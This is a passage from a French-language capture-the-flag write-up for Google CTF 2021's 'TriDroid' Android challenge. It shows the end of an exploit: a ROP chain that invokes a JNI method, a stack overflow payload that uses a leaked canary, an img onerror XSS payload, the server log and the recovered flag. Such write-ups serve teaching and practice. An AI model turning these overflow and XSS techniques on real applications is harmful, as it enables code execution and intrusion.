    // 0x0000000000042af0 : ret
    ret = libc_base + 0x42af0

    // jniEnv -> RDI
    // this -> RSI
    // @"showFlag" -> RDX
    // @"()V" -> RCX
    rop = pack64(pop_rcx)
    rop += pack64(libc_base + 0xD9510) // ()V
    rop += pack64(pop_rdx)
    rop += pack64(libc_base + 0xD9530) // showFlag
    rop += pack64(pop_rsi)
    rop += pack64(this_ptr)
    rop += pack64(pop_rdi)
    rop += pack64(JNI_env)
    rop += pack64(ret) // for stack alignment
    rop += pack64(invoke_addr)


    // overwrite RIP, after canary + EBP
    modify("41414141414141414141414141414141414141414141414141414141414141414141414141414141"+canary+"4242424242424242"+rop);

</span>
<img src="a" onerror="eval(document.getElementById('exp').innerHTML);" />
```

Nous l'avons encodé en base64 et l'avons envoyé au serveur en utilisant pwntools. Après plusieurs minutes, nous avons finalement obtenu le véritable flag chiffré :

```
== proof-of-work: enabled ==
please solve a pow first
You can run the solver with:
    python3 <(curl -sSL https://goo.gle/kctf-pow) solve s.AB8s.AAAxYZnbk+KFZ4qNDjonCqrl
===================


Welcome to TriDroid, the Triangle of Android:

                    /\
      DEX          /  \       Web
 (Java & Kotlin)  /    \  (HTML & JS)
                 /      \
                /________\

             Native (C & C++)

$ 
[*] Interrupted
[*] Switching to interactive mode

Thank you! Check out the logs. This may take a while ...

--------- beginning of kernel
--------- beginning of main
--------- beginning of system
07-26 21:42:54.017  4220  6232 D TriDroid: Flag: Fd60z2/WC/boWFPcZ1pbJW5v3eOjGcR3vajE7rPNN67pxtzYfNRYCE2XoTeOlw1uGYO24cqV/QnvD2rykyXzxQ==
--------- beginning of crash
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to tridroid.2021.ctfcompetition.com port 1337
```

Nous avons utilisé un interpréteur Java en ligne pour recalculer la clé et déchiffrer le flag.

Flag : **CTF{the_triangle_of_android_f62eb802e6aca13743e9}**
